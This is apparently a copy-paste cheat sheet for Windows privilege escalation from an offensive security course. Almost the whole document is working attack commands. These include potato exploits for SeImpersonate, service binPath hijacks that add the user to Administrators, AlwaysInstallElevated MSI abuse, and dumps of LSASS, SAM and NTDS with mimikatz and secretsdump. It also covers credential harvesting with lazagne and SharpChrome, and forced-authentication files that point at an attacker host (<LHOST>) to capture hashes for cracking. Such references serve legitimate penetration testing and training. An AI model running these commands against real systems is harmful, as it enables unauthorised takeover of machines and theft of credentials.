# Windows Privilege Escalation Cheat Sheet

Flat copy-paste reference (explanations in `26-windows-privesc/README.md`).
Placeholders: `<LHOST>`, `<PORT>`, `<ME>`, `<svc>`, `<file>`.

## Initial enumeration
```powershell
whoami /priv ; whoami /groups           # privileges + group SIDs (THE key check)
systeminfo ; wmic qfe                    # OS/patch level → missing-patch exploits
net user ; net localgroup administrators ; net accounts
tasklist /svc ; query user
ipconfig /all ; arp -a ; route print ; netstat -ano
Get-MpComputerStatus                      # Defender
Get-AppLockerPolicy -Effective | select -Expand RuleCollections
schtasks /query /fo LIST /v              # scheduled tasks
wmic service get name,pathname,startmode # services (unquoted paths)
```
Automate: **winPEAS**, **PowerUp** (`Invoke-AllChecks`), **Seatbelt**, **SharpUp**.

## Token privilege abuse (main service→SYSTEM path)
```text
# SeImpersonate / SeAssignPrimaryToken → potato → SYSTEM:
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"          # newer Windows
# via MSSQL service account:
mssqlclient.py <USER>@<host> -windows-auth  # enable_xp_cmdshell ; xp_cmdshell whoami /priv
# SeDebug → dump LSASS ; SeBackup/SeRestore → copy SAM/NTDS ; SeTakeOwnership → read any file:
takeown /f <file> ; icacls <file> /grant <ME>:F ; type <file> ; icacls <file> /reset
```
Maps 1:1 — SeImpersonate→potato, SeDebug→LSASS, SeBackup→NTDS/SAM, SeTakeOwnership→read-any-file.

## Privileged built-in groups (`whoami /groups`)
```text
# Backup Operators → NTDS.dit:
diskshadow.exe (script: create shadow of C: → expose)
robocopy /B E:\Windows\NTDS\ . ntds.dit ; reg save HKLM\SYSTEM SYSTEM.SAV
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
# Server Operators → repoint a service binPath (below)
# DnsAdmins → dnscmd /config /serverlevelplugindll <dll> ; sc stop dns ; sc start dns   (SYSTEM on DC)
# Event Log Readers → wevtutil qe Security /f:text | findstr "/user"   (4688 cmdlines)
```

## Service / permission misconfigs
```text
accesschk.exe -quvcw <svc>                  # weak service perms (SERVICE_CHANGE_CONFIG)
sc config <svc> binPath= "cmd /c net localgroup administrators <ME> /add"
sc stop <svc> ; sc start <svc>              # then restore binPath
icacls "<svc>.exe"                          # writable service binary → replace exe
wmic service get name,pathname,startmode    # unquoted path with spaces → drop C:\Program.exe
# AlwaysInstallElevated (both keys = 1 → any MSI runs as SYSTEM):
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msiexec /i x.msi /quiet /qn /norestart
```

## Credential dumping / hunting
```text
procdump.exe -accepteula -ma lsass.exe lsass.dmp      # → mimikatz sekurlsa::minidump / logonpasswords
reg save HKLM\SAM sam ; reg save HKLM\SYSTEM system    # secretsdump.py -sam sam -system system LOCAL
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
cmdkey /list ; runas /savecred /user:<dom>\<user> "<cmd>"
lazagne.exe all ; SharpChrome.exe logins /unprotect
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"   # autologon password
netsh wlan show profile <SSID> key=clear                                 # wifi password
# all users' PS history:
gc "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
```

## Forced auth (coerce hashes)
```text
# plant @Inventory.scf or a .lnk with IconLocation=\\<LHOST>\x on a writable share
responder -wrf -I <iface>   →   hashcat -m 5600 hash rockyou.txt
```

## Named exploits (fingerprint with systeminfo/wmic qfe/Get-HotFix)
```text
HiveNightmare/SeriousSAM CVE-2021-36934 ; PrintNightmare CVE-2021-1675/34527 (Invoke-Nightmare)
EternalBlue MS17-010 ; MS16-032 (Win7/2008) ; CVE-2020-0668 (service tracing)
# suggesters: windows-exploit-suggester.py --systeminfo sysinfo.txt ; Sherlock Find-AllVulns
# metasploit: post/multi/recon/local_exploit_suggester
```

> Read `whoami /priv` first, every time. **SeImpersonate → PrintSpoofer/GodPotato → SYSTEM** is the #1 Windows privesc (service accounts have it by default). `whoami /groups` catches Backup/Server/DnsAdmins paths. AlwaysInstallElevated + forced-auth are top quick wins. EOL boxes = easy but fragile — get sign-off before exploiting.
